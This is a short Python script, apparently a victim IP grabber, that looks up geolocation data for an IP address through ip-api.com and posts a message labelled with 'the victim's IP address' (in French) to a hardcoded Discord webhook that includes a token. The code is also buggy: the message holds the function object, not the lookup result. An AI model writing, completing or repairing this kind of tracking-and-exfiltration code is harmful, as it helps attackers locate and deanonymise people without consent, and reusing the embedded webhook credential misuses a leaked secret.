import requests 
import json

def ipgrab(ip):
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     return ip 

webhook_url = "https://discord.com/api/webhooks/1194596668771934258/mTijMHc4RfcKz6gkXkvI8M-yTJc9kE5rFhZD9HQ5e1Nu261hGh2_TeJBExK9P-gUozCN"
message =  f"l adresse ip de la victime est : ", ipgrab

payload = {
    "content": message
}

headers = {
    "Content-Type": "application/json"
}

response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
